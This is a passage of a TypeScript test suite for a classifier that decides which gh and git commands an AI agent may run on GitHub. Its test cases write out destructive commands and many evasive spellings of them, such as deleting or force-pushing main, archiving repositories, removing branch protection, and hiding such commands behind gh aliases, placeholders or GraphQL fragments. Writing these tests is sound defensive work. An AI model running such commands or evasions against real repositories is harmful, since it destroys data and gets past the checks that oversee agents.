    [["api", "-X", "POST", "repos/o/r/deployments/42/statuses", "--input", "status.json"], deployments],
    // The default branch: deleted, renamed, or force-updated (any force but false, or a body Paperclip cannot see).
    [["api", "-X", "DELETE", "repos/o/r/git/refs/heads/main"], defaultBranch],
    [["api", "--method", "DELETE", "repos/o/r/git/refs/heads/master/"], defaultBranch],
    [["api", "-X", "DELETE", "repos/o/r/git/refs/heads%2Fmain"], defaultBranch],
    [["api", "-X", "DELETE", "repos/{owner}/{repo}/git/refs/heads/{branch}"], defaultBranch],
    [["api", "-X", "PATCH", "repos/o/r/git/refs/heads/main", "-f", `sha=${sha}`, "-F", "force=true"], defaultBranch],
    [["api", "-X", "PATCH", "repos/o/r/git/refs/heads/main", "-f", `sha=${sha}`, "-f", "force=true"], defaultBranch],
    [["api", "repos/o/r/git/refs/heads/main", "-X", "PATCH", "--input", "ref.json"], defaultBranch],
    [["api", "-X", "POST", "repos/o/r/branches/main/rename", "-f", "new_name=trunk"], defaultBranch],
    // Values Paperclip cannot see (review round): a query string, a typed value gh fills from the checkout, a force that is not exactly false.
    [["api", "-X", "POST", "repos/o/r/deployments/9/statuses?state=inactive"], deployments],
    [["api", "-X", "POST", "repos/o/r/deployments/9/statuses", "-F", "state={branch}"], deployments],
    [["api", "-X", "PATCH", "repos/o/r/git/refs/heads/main?force=true", "-f", `sha=${sha}`], defaultBranch],
    [["api", "-X", "PATCH", "repos/o/r/git/refs/heads/main", "-f", `sha=${sha}`, "-f", "force=False"], defaultBranch],
    [["api", "-X", "PATCH", "repos/o/r/git/refs/heads/main", "-f", `sha=${sha}`, "-F", "force={branch}"], defaultBranch],
    [["api", "-X", "DELETE", "repos/o/r/tags/protection/3"], protection],
  ])("refuses gh %j", (args, what) => {
    expect(gh(...args)).toEqual(never(what));
  });

  it("refuses GraphQL mutations agents never run, aliased, mixed or by any GraphQL spelling", () => {
    for (const [query, what] of [
      ['mutation{archiveRepository(input:{repositoryId:"R"}){clientMutationId}}', repository],
      ['mutation{a: archiveRepository(input:{repositoryId:"R"}){clientMutationId}}', repository],
      ['mutation{unarchiveRepository(input:{repositoryId:"R"}){clientMutationId}}', repository],
      ['mutation{updateRepository(input:{repositoryId:"R",name:"x"}){clientMutationId}}', repository],
      ['mutation{transferRepository(input:{repositoryId:"R",ownerId:"O"}){clientMutationId}}', repository],
      ['mutation{deleteRef(input:{refId:"F"}){clientMutationId}}', defaultBranch],
      ['mutation{updateRef(input:{refId:"F",oid:"a",force:true}){clientMutationId}}', defaultBranch],
      ['mutation{updateRefs(input:{repositoryId:"R",refUpdates:[{name:"refs/heads/main",afterOid:"a",force:true}]}){clientMutationId}}', defaultBranch],
      ['mutation{createBranchProtectionRule(input:{repositoryId:"R",pattern:"main"}){clientMutationId}}', protection],
      ['mutation{deleteBranchProtectionRule(input:{branchProtectionRuleId:"B"}){clientMutationId}}', protection],
      ['mutation{updateRepositoryRuleset(input:{repositoryRulesetId:"S",enforcement:DISABLED}){clientMutationId}}', protection],
      ['mutation{deleteDeployment(input:{id:"D"}){clientMutationId}}', deployments],
      ['mutation{createDeploymentStatus(input:{deploymentId:"D",state:INACTIVE}){clientMutationId}}', deployments],
      ['mutation{deleteEnvironment(input:{id:"E"}){clientMutationId}}', deployments],
      ['mutation{addComment(input:{subjectId:"I",body:"x"}){clientMutationId} archiveRepository(input:{repositoryId:"R"}){clientMutationId}}', repository],
      ['query Q{viewer{login}} mutation M{deleteRef(input:{refId:"F"}){clientMutationId}}', defaultBranch],
    ] as const) {
      expect(graphql(query), query).toEqual(never(what));
    }
    for (const endpoint of ["https://api.github.com/graphql", "/GraphQL"]) {
      expect(gh("api", endpoint, "-f", 'query=mutation{archiveRepository(input:{repositoryId:"R"}){clientMutationId}}'), endpoint).toEqual(never(repository));
    }
  });

  it("refuses for every company the requests Paperclip cannot read, which could hide one of them", () => {
    for (const args of [
      ["api", "graphql", "-F", "query=@archive.graphql"],
      ["api", "graphql", "--input", "-"],
      ["api", "graphql", "-f", "query=mutation{archiveRepository(input:{repositoryId:\"R\"}){clientMutationId}"],
      ["api", "graphql", "-f", 'query=mutation{...M} fragment M on Mutation{archiveRepository(input:{repositoryId:"R"}){clientMutationId}}'],
      ["api", "-X", "PATCH", "repos/o/r/../r", "-F", "archived=true"],
      ["api", "-X", "PATCH", "repos/o/r/%E0%A4%A", "-F", "archived=true"],
      ["repo", "--yes", "archive"],
      // gh fills placeholders after the check, and a branch may be named heads/main, hooks/1, repos/o/r or deleteRef.
      ["api", "-X", "DELETE", "repos/{owner}/{repo}/git/refs/{branch}"],
      ["api", "-X", "DELETE", "repos/{owner}/{repo}/{branch}"],
      ["api", "-X", "DELETE", "repos/o/r/:branch"],
      ["api", "-X", "PATCH", "{branch}", "-F", "archived=true"],
      ["api", "graphql", "-F", 'query=mutation{addComment(input:{subjectId:"I",body:"x"}){clientMutationId} {branch}(input:{refId:"F"}){clientMutationId}}'],
      // A GraphQL mutation outside the comment and Project fence names its target by node ID: any of them may change settings.
      ["api", "graphql", "-f", 'query=mutation{updateRepositoryWebCommitSignoffSetting(input:{repositoryId:"R",webCommitSignoffRequired:false}){clientMutationId}}'],
      ["api", "graphql", "-f", 'query=mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}'],
    ]) {
      expect(gh(...args), args.join(" ")).toMatchObject({ access: "write", denied: expect.any(String), integrity: true });
    }
  });

  it.each([
    // Deleting or force-pushing the default branch, in every spelling git accepts.
    [["push", "origin", "--delete", "main"], {}],
    [["push", "--delete", "origin", "master"], {}],
    [["push", "-d", "origin", "main"], {}],
    [["push", "origin", ":main"], {}],
    [["push", "origin", ":refs/heads/main"], {}],
    [["push", "origin", "+HEAD:main"], { currentBranch: "feature" }],
    [["push", "origin", "+main"], {}],
    [["push", "origin", "+feature:heads/main"], {}],
    [["push", "-f", "origin", "main"], {}],
    [["push", "-uf", "origin", "main"], {}],
    [["push", "--force", "origin", "HEAD"], { currentBranch: "main" }],
    [["push", "--force-with-lease", "origin", "main"], {}],
    [["push", `--force-with-lease=main:${sha}`, "origin", "main"], {}],
    [["push", "-f"], { currentBranch: "main" }],
    [["push", "-f"], {}],
    [["push", "--mirror", "origin"], {}],
    [["push", "--all", "--force", "origin"], {}],
    [["push", "--prune", "origin", "refs/heads/*:refs/heads/*"], {}],
    [["push", "origin", "+:"], {}],
    [["push", "--force", "origin", "refs/heads/*:refs/heads/*"], {}],
    [["push", "origin", "+feature:refs/heads/master"], { refs: { feature: "refs/heads/feature" } }],
    [["-c", "remote.origin.push=+refs/heads/*:refs/heads/*", "push"], { currentBranch: "feature", implicitPush: true }],
  ] as const)("refuses git %j", (args, context) => {
    expect(classifyGitHubCommand("git", args, { touchesWorkflows: false, ...context })).toEqual(never(defaultBranch));
  });

  it("still allows every legitimate agent write", () => {
    const clean = { touchesWorkflows: false };
    // Pull requests, issues, comments and Projects.
    expect(gh("pr", "create", "--fill")).toEqual(write("pullRequest"));
    expect(gh("pr", "edit", "3", "--title", "x", "--add-label", "bug")).toEqual(write("pullRequest"));
    expect(gh("pr", "merge", "5", "--squash", "--delete-branch", "--match-head-commit", sha)).toEqual(write("pullRequest"));
    expect(gh("pr", "merge", "5", "--admin", "--squash", "--match-head-commit", sha)).toEqual(write("pullRequest", "adminMerge"));
    expect(gh("api", "-X", "PUT", "repos/o/r/pulls/5/merge", "-f", `sha=${sha}`)).toEqual(write("pullRequest", "adminMerge"));
    expect(gh("pr", "comment", "5", "-b", "x")).toEqual(write("comment"));
    expect(gh("pr", "review", "5", "--approve")).toEqual(write("comment"));
    expect(gh("issue", "create", "-t", "x", "-b", "y")).toEqual(write("other"));
    expect(gh("issue", "comment", "1", "-b", "x")).toEqual(write("comment"));
    expect(gh("api", "-X", "PATCH", "repos/o/r/issues/1", "-f", "state=closed")).toEqual(write("other"));
    expect(gh("api", "-X", "PATCH", "repos/o/r/pulls/3", "-f", "title=x")).toEqual(write("pullRequest"));
    expect(gh("project", "item-edit", "--id", "I", "--project-id", "P", "--field-id", "F", "--text", "x")).toEqual(write("project"));
    expect(graphql('mutation{updateProjectV2ItemFieldValue(input:{projectId:"P",itemId:"I",fieldId:"F",value:{text:"x"}}){clientMutationId}}')).toEqual(write("project"));
    expect(graphql('mutation{addComment(input:{subjectId:"I",body:"x"}){clientMutationId}}')).toEqual(write("comment"));
    // Repositories: creating or forking one, syncing without --force or a feature branch with it, and reads.
    expect(gh("repo", "create", "o/new", "--private")).toEqual(write("other"));
    expect(gh("repo", "fork", "o/r")).toEqual(write("other"));
    expect(gh("repo", "sync")).toEqual(write("push", "pushToMain"));
    // A named branch the sync hard-resets is checked against GitHub's default and protected branches by the server.
    expect(gh("repo", "sync", "--branch", "feature", "--force")).toEqual({ ...write("push", "pushToMain"), branchRewrites: ["feature"] });
    expect(gh("repo", "deploy-key", "list")).toEqual(write("other"));
    // Placeholders stay usable where they decide nothing: GraphQL variables, a pull request's head, the repository of a read.
    expect(gh("api", "graphql", "-F", "owner={owner}", "-F", "name={repo}", "-f", "query=query($owner:String!,$name:String!){repository(owner:$owner,name:$name){id}}")).toEqual(read);
    expect(gh("api", "-X", "POST", "repos/{owner}/{repo}/pulls", "-F", "head={branch}", "-f", "base=main", "-f", "title=x")).toEqual(write("pullRequest"));
    expect(gh("api", "repos/{owner}/{repo}/pulls")).toEqual(read);
    // Help and the ls aliases of list are reads.
    for (const args of [["secret", "ls"], ["variable", "ls"], ["repo", "--help"], ["pr", "-h"]]) expect(gh(...args), args.join(" ")).toEqual(read);
    for (const args of [["repo", "view", "o/r"], ["secret", "list"], ["variable", "list"], ["variable", "get", "NAME"], ["ruleset", "list"],
      ["api", "repos/o/r"], ["api", "repos/o/r/hooks"], ["api", "repos/o/r/actions/secrets"], ["api", "-X", "GET", "repos/o/r/branches/main/protection"],
      ["api", "repos/o/r/rulesets"], ["api", "repos/o/r/environments"], ["api", "repos/o/r/deployments/42/statuses"]]) {
      expect(gh(...args), args.join(" ")).toEqual(read);
    }
    // Deployments: creating one, and statuses other than inactive, stay deployment approvals; so do pending deployments.
    expect(gh("api", "-X", "POST", "repos/o/r/deployments", "-f", "ref=main")).toEqual(write("other", "deploymentApproval"));
    expect(gh("api", "-X", "POST", "repos/o/r/deployments/42/statuses", "-f", "state=success")).toEqual(write("other", "deploymentApproval"));
    expect(gh("api", "-X", "POST", "repos/o/r/actions/runs/77/pending_deployments", "-F", "environment_ids[]=1", "-f", "state=approved")).toEqual(write("other", "deploymentApproval"));
    // Feature branches: deleted, renamed or force-updated through the API; the default branch updated without force.
    expect(gh("api", "-X", "DELETE", "repos/o/r/git/refs/heads/feature/x")).toEqual({ ...write("push"), branchRewrites: ["feature/x"] });
    expect(gh("api", "-X", "PATCH", "repos/o/r/git/refs/heads/feature", "-f", `sha=${sha}`, "-F", "force=true")).toEqual({ ...write("push"), branchRewrites: ["feature"] });
    expect(gh("api", "-X", "POST", "repos/o/r/branches/feature/rename", "-f", "new_name=feature-2")).toEqual({ ...write("other"), branchRewrites: ["feature"] });
    expect(gh("api", "-X", "PATCH", "repos/o/r/git/refs/heads/main", "-f", `sha=${sha}`)).toEqual(write("push", "pushToMain"));
    expect(gh("api", "-X", "PATCH", "repos/o/r/git/refs/heads/main", "-f", `sha=${sha}`, "-F", "force=false")).toEqual(write("push", "pushToMain"));
    // git push: feature branches pushed, force-pushed (lease or not) and deleted; the default branch pushed without force.
    const git = (args: string[], context: Record<string, unknown> = {}) => classifyGitHubCommand("git", args, { ...clean, ...context });
    expect(git(["push", "-u", "origin", "feature/x"])).toEqual(write("push"));
    // Forced or deleted feature branches name the branch for the server's protected-branch check.
    const rewrites = (...branches: string[]) => ({ ...write("push"), branchRewrites: branches });
    expect(git(["push", "--force-with-lease", "origin", "feature/x"])).toEqual(rewrites("feature/x"));
    expect(git(["push", "--force-with-lease", "--force-if-includes", "origin", "HEAD"], { currentBranch: "feature/x" })).toEqual(rewrites("feature/x"));
    expect(git(["push", "-f", "origin", "feature/x"])).toEqual(rewrites("feature/x"));
    expect(git(["push", "origin", "+feature/x"])).toEqual(rewrites("feature/x"));
    expect(git(["push", "-f"], { currentBranch: "feature/x" })).toEqual(rewrites("feature/x"));
    expect(git(["push", "origin", "--delete", "feature/x"])).toEqual(rewrites("feature/x"));
    expect(git(["push", "origin", ":feature/x"])).toEqual(rewrites("feature/x"));
    expect(git(["push", "--prune", "origin", "feature/x"])).toEqual(write("push"));
    expect(git(["push", "origin", "+feature/x", "main"])).toEqual({ ...write("push", "pushToMain"), branchRewrites: ["feature/x"] });
    expect(git(["push", "origin", "main"])).toEqual(write("push", "pushToMain"));
    expect(git(["push", "--all", "origin"])).toEqual(write("push", "pushToMain"));
    expect(git(["push", "origin", ":"])).toEqual(write("push", "pushToMain"));
  });
});

// ---------------------------------------------------------------------------
// Security review of PR #23 at 99d6cb10: gh aliases and extensions, and protected branches other than main/master.
// ---------------------------------------------------------------------------
describe("security review of the agents-never deny (round 2)", () => {
  const read = { access: "read", action: null, privileged: [] };
  const write = (action: string, ...privileged: string[]) => ({ access: "write", action, privileged });
  const sha = "a".repeat(40);
  const gh = (...args: string[]) => classifyGitHubCommand("gh", args);
  const integrity = (pattern: RegExp) => expect.objectContaining({ access: "write", denied: expect.stringMatching(pattern), integrity: true });

  it("M1: never creates a gh alias, and never runs one, an extension or the Copilot CLI with GitHub access", () => {
    for (const args of [
      ["alias", "set", "wipe", "repo archive --yes"],
      ["alias", "set", "--shell", "wipe", "gh repo archive --yes"],
      ["alias", "set", "--clobber", "x", "api -X DELETE repos/o/r/hooks/1"],
      ["alias", "import", "aliases.yml"],
      ["alias", "import", "-"],
    ]) expect(gh(...args), args.join(" ")).toEqual(integrity(/does not create gh aliases/));
    for (const args of [["extension", "exec", "wipe"], ["extension", "exec", "wipe", "--yes"], ["copilot"], ["copilot", "-p", "archive this repository"]]) {
      expect(gh(...args), args.join(" ")).toEqual(integrity(/with GitHub access: it cannot tell what/));
    }
    // gh runs an alias or an extension for a name it does not know: refused for every company, whatever its arguments.
    for (const args of [["wipe"], ["wipe", "--yes"], ["-R", "o/r", "wipe"], ["wipe", "-R", "o/r"], ["deployment", "delete", "42"], ["image", "a.png"], ["Pr", "list"]]) {
      expect(gh(...args), args.join(" ")).toEqual(integrity(/does not know the gh command/));
    }
    // The launcher's own grammar: none of these runs without a managed credential either.
    for (const args of [["wipe"], ["alias", "set", "x", "y"], ["alias", "import", "a.yml"], ["extension", "exec", "x"], ["copilot"]]) {
      expect(ghCommandMayWrite(parseGhCommand(args)), args.join(" ")).toBe(true);
    }
  });

  it("M1: keeps gh's reads and its own write groups working", () => {
    for (const args of [["alias", "list"], ["alias", "ls"], ["alias", "delete", "x"], ["alias"], ["extension", "list"], ["extension", "search", "x"],
      ["extension", "install", "owner/gh-x"], ["co", "12"], ["environment"], ["reference"], ["help", "repo"], ["version"], ["--version"]]) {
      expect(gh(...args), args.join(" ")).toEqual(read);
    }
    for (const args of [["label", "create", "bug"], ["gist", "create", "a.txt"], ["codespace", "list"], ["cache", "delete", "x"], ["discussion", "create"], ["skill", "install", "x"]]) {
      expect(gh(...args), args.join(" ")).toEqual(write("other"));
    }
  });

  it("M2: names every branch a write forces, deletes, renames or hard-resets, so the server checks it with GitHub", () => {
    const git = (args: string[], context: Record<string, unknown> = {}) => classifyGitHubCommand("git", args, { touchesWorkflows: false, ...context });
    expect(git(["push", "--force", "origin", "protected"])).toEqual({ ...write("push"), branchRewrites: ["protected"] });
    expect(git(["push", "origin", "--delete", "protected"])).toEqual({ ...write("push"), branchRewrites: ["protected"] });
    expect(git(["push", "origin", "+HEAD:develop", ":release/1", "feature"], { currentBranch: "feature" })).toEqual({ ...write("push"), branchRewrites: ["develop", "release/1"] });
    expect(git(["push", "--force-with-lease=develop:" + sha, "origin", "develop"])).toEqual({ ...write("push"), branchRewrites: ["develop"] });
    expect(gh("api", "-X", "PATCH", "repos/o/r/git/refs/heads/develop", "-f", `sha=${sha}`, "-f", "force=true")).toEqual({ ...write("push"), branchRewrites: ["develop"] });
    expect(gh("api", "repos/o/r/git/refs/heads/develop", "-X", "PATCH", "--input", "ref.json")).toEqual({ ...write("push"), branchRewrites: ["develop"] });
    expect(gh("api", "-X", "DELETE", "repos/o/r/git/refs/heads/release%2F1")).toEqual({ ...write("push"), branchRewrites: ["release/1"] });
    expect(gh("api", "-X", "POST", "repos/o/r/branches/develop/rename", "-f", "new_name=dev")).toEqual({ ...write("other"), branchRewrites: ["develop"] });
    expect(gh("repo", "sync", "--force", "--branch", "develop")).toEqual({ ...write("push", "pushToMain"), branchRewrites: ["develop"] });
    expect(gh("repo", "sync", "o/fork", "--force", "-bdevelop")).toEqual({ ...write("push", "pushToMain"), branchRewrites: ["develop"] });
    // Plain updates of a branch rewrite nothing: GitHub's own protection applies to them.
    expect(git(["push", "origin", "develop"])).toEqual(write("push"));
    expect(gh("api", "-X", "PATCH", "repos/o/r/git/refs/heads/develop", "-f", `sha=${sha}`)).toEqual(write("push"));
    expect(gh("api", "-X", "PATCH", "repos/o/r/git/refs/heads/develop", "-f", `sha=${sha}`, "-F", "force=false")).toEqual(write("push"));
    expect(gh("repo", "sync", "--branch", "develop")).toEqual(write("push", "pushToMain"));
    // Refused writes carry nothing to check.
    expect(gh("api", "-X", "DELETE", "repos/o/r/git/refs/heads/main")).not.toHaveProperty("branchRewrites");
  });

  it("denies deletes, force-pushes and rewrites of staging and production by name, whatever GitHub reports", () => {
    const git = (args: string[]) => classifyGitHubCommand("git", args, { touchesWorkflows: false });
    const floor = /delete or force-push a default or protected branch/;
    for (const branch of ["staging", "production", "Production", "STAGING", "Main"]) {
      expect(git(["push", "--force", "origin", branch]).denied, branch).toMatch(floor);
      expect(git(["push", "origin", "--delete", branch]).denied, `delete ${branch}`).toMatch(floor);
      expect(git(["push", "origin", `:${branch}`]).denied, `:${branch}`).toMatch(floor);
      expect(git(["push", "origin", `+HEAD:${branch}`]).denied, `+HEAD:${branch}`).toMatch(floor);
      expect(gh("api", "-X", "DELETE", `repos/o/r/git/refs/heads/${encodeURIComponent(branch)}`).denied, `DELETE ${branch}`).toMatch(floor);
      expect(gh("api", "--method", "DELETE", `https://api.github.com/repos/o/r/git/refs/heads/${branch}`).denied, `url ${branch}`).toMatch(floor);
      expect(gh("api", "-X", "PATCH", `repos/o/r/git/refs/heads/${branch}`, "-f", `sha=${sha}`, "-f", "force=true").denied, `force ${branch}`).toMatch(floor);
      expect(gh("api", "-X", "POST", `repos/o/r/branches/${branch}/rename`, "-f", "new_name=dev").denied, `rename ${branch}`).toMatch(floor);
      expect(gh("repo", "sync", "--force", "--branch", branch).denied, `sync ${branch}`).toMatch(floor);
    }
    // A fast-forward push to those branches is still an ordinary write. Only the rewrite is refused.
    expect(git(["push", "origin", "staging"])).toEqual(write("push"));
    expect(git(["push", "origin", "production"])).toEqual(write("push"));
    expect(gh("repo", "sync", "--branch", "staging")).toEqual(write("push", "pushToMain"));
  });
});
